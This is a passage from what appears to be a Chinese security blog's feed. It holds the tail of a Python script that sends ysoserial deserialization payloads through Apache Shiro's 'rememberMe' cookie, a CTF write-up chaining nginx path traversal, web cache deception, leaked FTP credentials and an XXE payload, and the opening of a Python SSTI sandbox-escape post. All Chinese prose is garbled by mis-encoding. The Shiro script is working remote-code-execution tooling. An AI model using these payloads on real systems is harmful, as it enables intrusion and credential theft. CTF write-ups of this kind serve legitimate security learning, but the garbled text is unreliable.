(groupId, artifactId, version)</span><br><span class="line">    child = Popen(mvncmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">    child.wait()</span><br><span class="line">    <span class="comment">#yso_path, mvn_home, jar_path, gadget, command</span></span><br><span class="line">    cmd2 = <span class="string">"&#123;0&#125;:&#123;2&#125;:&#123;1&#125;/net/iharder/base64/2.3.9/base64-2.3.9.jar:&#123;1&#125;/commons-io/commons-io/2.6/commons-io-2.6.jar:&#123;1&#125;/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:&#123;1&#125;/com/google/guava/guava/15.0/guava-15.0.jar:&#123;1&#125;/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:&#123;1&#125;/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:&#123;1&#125;/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:&#123;1&#125;/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:&#123;1&#125;/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:&#123;1&#125;/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:&#123;1&#125;/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:&#123;1&#125;/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:&#123;1&#125;/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:&#123;1&#125;/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:&#123;1&#125;/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:&#123;1&#125;/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:&#123;1&#125;/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:&#123;1&#125;/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:&#123;1&#125;/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:&#123;1&#125;/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:&#123;1&#125;/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:&#123;1&#125;/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:&#123;1&#125;/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:&#123;1&#125;/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:&#123;1&#125;/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:&#123;1&#125;/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:&#123;1&#125;/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:&#123;1&#125;/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:&#123;1&#125;/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:&#123;1&#125;/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:&#123;1&#125;/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:&#123;1&#125;/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:&#123;1&#125;/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:&#123;1&#125;/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:&#123;1&#125;/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:&#123;1&#125;/antlr/antlr/2.7.7/antlr-2.7.7.jar:&#123;1&#125;/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:&#123;1&#125;/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:&#123;1&#125;/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:&#123;1&#125;/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:&#123;1&#125;/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:&#123;1&#125;/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:&#123;1&#125;/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:&#123;1&#125;/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:&#123;1&#125;/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:&#123;1&#125;/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:&#123;1&#125;/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:&#123;1&#125;/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:&#123;1&#125;/xalan/xalan/2.7.2/xalan-2.7.2.jar:&#123;1&#125;/xalan/serializer/2.7.2/serializer-2.7.2.jar:&#123;1&#125;/rome/rome/1.0/rome-1.0.jar:&#123;1&#125;/jdom/jdom/1.0/jdom-1.0.jar:&#123;1&#125;/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:&#123;1&#125;/rhino/js/1.7R2/js-1.7R2.jar:&#123;1&#125;/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:&#123;1&#125;/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:&#123;1&#125;/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:&#123;1&#125;/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:&#123;1&#125;/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:&#123;1&#125;/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:&#123;1&#125;/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:&#123;1&#125;/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:&#123;1&#125;/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:&#123;1&#125;/javax/inject/javax.inject/1/javax.inject-1.jar:&#123;1&#125;/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:&#123;1&#125;/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:&#123;1&#125;/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:&#123;1&#125;/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:&#123;1&#125;/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:&#123;1&#125;/org/w3c/css/sac/1.3/sac-1.3.jar:&#123;1&#125;/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:&#123;1&#125;/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:&#123;1&#125;/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:&#123;1&#125;/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar:&#123;1&#125;/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar:&#123;1&#125;/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar"</span>.format(yso_path, mvn_home, jar_path)</span><br><span class="line"></span><br><span class="line">    print(version)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-cp'</span>, cmd2, <span class="string">"ysoserial.GeneratePayload"</span>, gadget, command],stdout=subprocess.PIPE)</span><br><span class="line">    payload = popen.stdout.read()</span><br><span class="line">    base64_ciphertext = encode(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">        <span class="comment">#r = requests.get(target, cookies=&#123;'rememberMe': base64_ciphertext.decode()&#125;, timeout=10, proxies=&#123;'http':'127.0.0.1:8080'&#125;)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a><br><a href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html">https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html</a><br><a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a><br><a href="https://www.cnblogs.com/Ahanu/p/5051090.html">https://www.cnblogs.com/Ahanu/p/5051090.html</a><br><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a><br><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>nginxçš„ç§˜å¯†wp</title>
    <url>/2018/06/26/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/</url>
    <content><![CDATA[<!-- sctf2018 nginxçš„ç§˜å¯† å®˜æ–¹writeup -->
<!-- more -->
<h2 id="ç¬¬ä¸€æ­¥ï¼Œwebç¼“å­˜æ¼æ´"><a href="#ç¬¬ä¸€æ­¥ï¼Œwebç¼“å­˜æ¼æ´" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼Œwebç¼“å­˜æ¼æ´"></a>ç¬¬ä¸€æ­¥ï¼Œwebç¼“å­˜æ¼æ´</h2><p>å®Œæˆä¸€æ­¥éœ€ä¸‰ä¸ªç‚¹ç»“åˆã€‚</p>
<p>ç¬¬ä¸€ç‚¹ï¼š</p>
<p>è§‚å¯Ÿåˆ°<code>static</code>æœ‰å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè™½ç„¶æ²¡å¼€<code>autoindex</code>ä½†ä¾ç„¶å¯ä»¥é€šè¿‡<code>/static../etc/passwd</code>ä¸‹è½½æ–‡ä»¶ã€‚ç»“åˆæç¤ºä»nginxçš„é…ç½®å¼€å§‹ï¼Œå¯ä»¥æƒ³åˆ°ä¸‹è½½<code>nginx.conf</code>ï¼Œä¸‹è½½çš„è·¯å¾„æ˜¯é»˜è®¤çš„nginxå®‰è£…è·¯å¾„<code>/static../etc/nginx/nginx.conf</code>ã€‚å¯ä»¥çœ‹åˆ°nginxé…ç½®ï¼Œdiffä¸€ä¸‹å¯ä»¥çœ‹åˆ°å…³é”®ç‚¹åœ¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxy_cache_path &#x2F;tmp&#x2F;mycache levels&#x3D;1:2 keys_zone&#x3D;my_cache:10m max_size&#x3D;10g inactive&#x3D;30s use_temp_path&#x3D;off;</span><br><span class="line">	</span><br><span class="line">	limit_conn_zone $binary_remote_addr zone&#x3D;conn:10m;</span><br><span class="line">	limit_req_zone  $binary_remote_addr zone&#x3D;allips:10m rate&#x3D;2r&#x2F;s;</span><br><span class="line">	</span><br><span class="line">	server &#123;</span><br><span class="line">	    listen 4455 default_server;</span><br><span class="line">	    server_name localhost;</span><br><span class="line">	    location &#x2F;static &#123;</span><br><span class="line">	        alias &#x2F;home&#x2F;;</span><br><span class="line">	    &#125;</span><br><span class="line">	    location ~* \.(css|js|gif|png)&#123;</span><br><span class="line">	        proxy_cache             my_cache;</span><br><span class="line">	        proxy_cache_valid       200 30s;</span><br><span class="line">	        proxy_pass              http:&#x2F;&#x2F;bugweb.app:8000;</span><br><span class="line">	        proxy_set_header        Host $host:$server_port;</span><br><span class="line">	        proxy_ignore_headers    Expires Cache-Control Set-Cookie;</span><br><span class="line">	    &#125;</span><br><span class="line">	    location &#x2F; &#123;</span><br><span class="line">	        limit_conn conn 20;</span><br><span class="line">	        proxy_pass       http:&#x2F;&#x2F;bugweb.app:8000;</span><br><span class="line">	        proxy_set_header Host $host:$server_port;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç‚¹</p>
<p>é€šè¿‡ä¸€äº›æ–¹æ³•å‘ç°è·¯ç”±æ˜ å°„å’Œäº›å°é—®é¢˜ã€‚ä¾‹å¦‚åœ¨æ‰«æç›®å½•çš„æ—¶å€™å¯ä»¥å‘ç°è¿™äº›ã€‚<br><img src="path.jpg" alt=""></p>
<p>ç™»é™†åè®¿é—®å‘ç°ï¼Œè¿™äº›è·¯ç”±éƒ½æ˜¯è®¿é—®çš„<code>edit</code>é¡µé¢ï¼Œéšä¾¿æµ‹<code>editxxx</code>å‘ç°ä¹Ÿæ˜ å°„åˆ°ç›¸åŒçš„é¡µé¢ã€‚çŒœæµ‹åå°è·¯ç”±çš„é€»è¾‘æ˜¯åªè¦è®¿é—®çš„æ˜¯ä»¥<code>edit</code>å¼€å¤´éƒ½ç›¸å½“äºè®¿é—®<code>edit</code>ã€‚</p>
<p><img src="router.jpg" alt=""></p>
<p>ç¬¬ä¸‰ç‚¹ï¼š</p>
<p>æœ‰ä¸€ä¸ª<code>post_bug</code>ï¼Œè¿™ä¸ªç‚¹çš„åŠŸèƒ½æ˜¯ç»™æäº¤bugç»™ç®¡ç†å‘˜ï¼Œç®¡ç†å‘˜ä¼šç‚¹å‡»æŸ¥çœ‹ã€‚æœ‰ä¸€ä¸ª<code>write_plan</code>å¯ä»¥å†™ä¸€äº›ä¸œè¥¿ï¼Œå…¶ä»–äººçœ‹ä¸è§ã€‚å¦‚æœä½ è®¿é—®è¿‡<code>/user/admin</code>è¿˜ä¼šå‘ç°ä¸€ä¸ªå°tipç®¡ç†å‘˜è¯´è‡ªå·±å·²ç»æŠŠæ‰€æœ‰å¯†ç å†™åœ¨ç§˜å¯†è®¡åˆ’é‡Œé¢äº†ã€‚</p>
<p>ä¸‰ä¸ªç‚¹ç»“åˆèµ·æ¥å¯ä»¥è§¦å‘webç¼“å­˜æ¼æ´ã€‚å‘é€<code>http://xxxxx/write_plan/23333.png</code>åç«‹å³è®¿é—®å°±å¯ä»¥çœ‹åˆ°ç®¡ç†å‘˜çš„ç§˜å¯†è®¡åˆ’ã€‚</p>
<p><img src="postbug.png" alt="postbug.png"></p>
<p>çœ‹åˆ°çš„ä¸œè¥¿å¦‚ä¸‹</p>
<p>æ‹¿åˆ°å†…ç½‘ftpæœåŠ¡å™¨çš„è´¦å·å¯†ç ã€‚ syc10ver Eec5TN9fruOOTp2G ã€‚</p>
<p><img src="plan.png" alt="plan.png"></p>
<h2 id="ç¬¬äºŒæ­¥ï¼Œxxeçš„ä¸¤ä¸ªåè®®"><a href="#ç¬¬äºŒæ­¥ï¼Œxxeçš„ä¸¤ä¸ªåè®®" class="headerlink" title="ç¬¬äºŒæ­¥ï¼Œxxeçš„ä¸¤ä¸ªåè®®"></a>ç¬¬äºŒæ­¥ï¼Œxxeçš„ä¸¤ä¸ªåè®®</h2><p>å¦‚æœæœ‰å¸ˆå‚…æŠŠç¬¬ä¸€æ­¥åšå‡ºæ¥äº†ï¼Œç›¸ä¿¡ä¸‹é¢çš„æ“ä½œä¹Ÿå¾ˆç®€å•äº†ã€‚è™½ç„¶é¢˜ç›®æç¤ºç»™çš„æ˜¯ä»nginxå¼€å§‹ï¼Œä½†æ˜¯æˆ‘æ€»æ˜¯æ„Ÿè§‰å¾ˆå¤šå¸ˆå‚…ç¬¬ä¸€ä¸ªæ‰¾åˆ°çš„æ¼æ´ç‚¹æ˜¯xxeã€‚è§¦å‘ç‚¹åœ¨ä¸Šä¼ è®¡åˆ’é‚£é‡Œï¼Œxmlæ–‡ä»¶ä¸­çš„å¤–éƒ¨å®ä½“å¯ä»¥è¢«è§£æã€‚</p>
<p>ä¹‹æ‰€ä»¥è¦å¤šå‡ºä¸€æ­¥ï¼Œæ˜¯æˆ‘è§‰å¾—æœ‰ä¸¤ä¸ªtipè¿˜æ˜¯æœ‰äº›å¸ˆå‚…æ²¡ï¼ˆå¼ºï¼‰æœ‰ï¼ˆè¡Œï¼‰å…³ï¼ˆå¢ï¼‰æ³¨ï¼ˆåŠ ï¼‰åˆ°ï¼ˆéš¾åº¦ï¼‰ã€‚</p>
<ol>
<li>urlçš„å®Œæ•´çš„å½¢å¼æ˜¯<code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></li>
<li><code>proc</code>ä¼ªæ–‡ä»¶ä¸­æœ‰arpä¿¡æ¯</li>
</ol>
<p>æˆ‘è¿™é‡Œç”¨çš„è§£æxmlçš„pythonåº“åŠ è½½å¤–éƒ¨å®ä½“çš„æ—¶å€™ç”¨çš„æ˜¯urlopenï¼Œå¦‚æœæ²¡è®°é”™çš„è¯åªæ”¯æŒ<code>ftp</code>ï¼Œ<code>http</code>ï¼Œ<code>file</code>ã€‚ä¸Šä¼ </p>
<p><img src="proc.png" alt="proc.png"></p>
<p>è¯»ç›®å½•ï¼ŒæŠŠä¸¤ä¸ªipéƒ½è¯•è¯•</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">"ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/"</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plans</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">plan</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">content</span>&gt;</span>payload <span class="symbol">&amp;remote;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">plan</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="dir.png" alt="dir.png"></p>
<p>è¯»flag</p>
<p>æœ€åget flag</p>
<p><img src="flag.png" alt="flag.png"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web cache</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨pythonç»§æ‰¿é“¾æäº‹æƒ…</title>
    <url>/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/</url>
    <content><![CDATA[<!-- ç»§æ‰¿é“¾è¿™ä¸ªè¿™ä¸ªè¯æ˜¯æˆ‘è‡ªå·±å‘æ˜çš„ã€‚çœ‹åˆ°æœ‰çš„å¸ˆå‚…åšå®¢ä¸­å°†å®ƒç§°ä¸ºeggæˆ–è€…sstiï¼Œä½†æ˜¯æˆ‘å–œæ¬¢å«å®ƒç»§æ‰¿é“¾å› ä¸ºæ„Ÿè§‰å¾ˆç”ŸåŠ¨ã€‚æœ€æ—©é‡åˆ°è¿™ç§å§¿åŠ¿æ˜¯åœ¨å­¦ä¹ python bypassæ²™ç›’çš„æ—¶å€™ã€‚å½“æ—¶ä¸æ˜¯å¾ˆç†è§£å½¢å¦‚`().__class__.__bases__[0].__subclasses__()`çš„æ„æ€ã€‚å­¦ä¹ ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å†³å®šæ¥æ€»ç»“ä¸€ä¸‹æ„é€ ç»§æ‰¿é“¾çš„æ–¹æ³•ï¼Œå¹¶ä¸”ç”¨æ­¤æ–¹æ³•åœ¨djangoæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æƒ…å†µä¸‹è¯»å–é…ç½®æ–‡ä»¶ï¼ˆçµæ„Ÿæ¥è‡ªpå¸ˆå‚…åšå®¢ï¼‰ã€‚ -->
<!-- more -->

<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç»§æ‰¿é“¾è¿™ä¸ªè¿™ä¸ªè¯æ˜¯æˆ‘è‡ªå·±å‘æ˜çš„ã€‚çœ‹åˆ°æœ‰çš„å¸ˆå‚…åšå®¢ä¸­å°†å®ƒç§°ä¸ºeggæˆ–è€…sstiï¼Œä½†æ˜¯æˆ‘å–œæ¬¢å«å®ƒç»§æ‰¿é“¾å› ä¸ºæ„Ÿè§‰å¾ˆç”ŸåŠ¨ã€‚æœ€æ—©é‡åˆ°è¿™ç§å§¿åŠ¿æ˜¯åœ¨å­¦ä¹ python bypassæ²™ç›’çš„æ—¶å€™ã€‚å½“æ—¶ä¸æ˜¯å¾ˆç†è§£å½¢å¦‚<code>().__class__.__bases__[0].__subclasses__()</code>çš„æ„æ€ã€‚å­¦ä¹ ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å†³å®šæ¥æ€»ç»“ä¸€ä¸‹æ„é€ ç»§æ‰¿é“¾çš„æ–¹æ³•ï¼Œå¹¶ä¸”ç”¨æ­¤æ–¹æ³•åœ¨djangoæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æƒ…å†µä¸‹è¯»å–é…ç½®æ–‡ä»¶ï¼ˆçµæ„Ÿæ¥è‡ªpå¸ˆå‚…åšå®¢ï¼‰ã€‚</p>
<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="bases"><a href="#bases" class="headerlink" title="bases"></a><strong>bases</strong></h2><p>è¿”å›ä¸€ä¸ªç±»ç›´æ¥æ‰€ç»§æ‰¿çš„ç±»ï¼ˆå…ƒç»„å½¢å¼ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base2</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(Base1, Base2)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span><span class="params">(test)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> test.__bases__</span><br><span class="line"><span class="keyword">print</span> test2.__bases__</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class __main__.Base1 at 0x0322ADF8&gt;, &lt;class __main__.Base2 at 0x0322AE30&gt;)</span></span><br><span class="line"><span class="string">(&lt;class __main__.test at 0x0322AE68&gt;,)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

